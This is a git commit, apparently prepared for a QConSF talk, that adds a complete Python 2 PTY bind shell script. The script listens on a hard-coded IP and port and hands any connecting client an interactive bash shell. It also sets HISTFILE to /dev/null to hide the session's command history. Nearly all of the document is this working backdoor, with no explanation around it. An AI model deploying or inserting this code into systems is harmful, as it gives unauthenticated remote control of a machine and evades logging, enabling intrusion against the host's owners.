1f421ace9652b40538e1e49d1ec3a113115d8e8f
Bryan Chua <bryan@shopback.com>
2016-11-11 11:21:44 -0800

    for QConSF

---
+++ ptybindshell.py
@@ -0,0 +1,22 @@
+#!/usr/bin/python2
+# https://raw.githubusercontent.com/infodox/python-pty-shells/master/tcp_pty_bind.py
+import os
+import pty
+import socket
+
+lport = 9011
+
+def main():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind(('54.67.45.208', lport))
+    s.listen(1)
+    (rem, addr) = s.accept()
+    os.dup2(rem.fileno(),0)
+    os.dup2(rem.fileno(),1)
+    os.dup2(rem.fileno(),2)
+    os.putenv("HISTFILE",'/dev/null')
+    pty.spawn("/bin/bash")
+    s.close()
+	
+if __name__ == "__main__":
+    main()
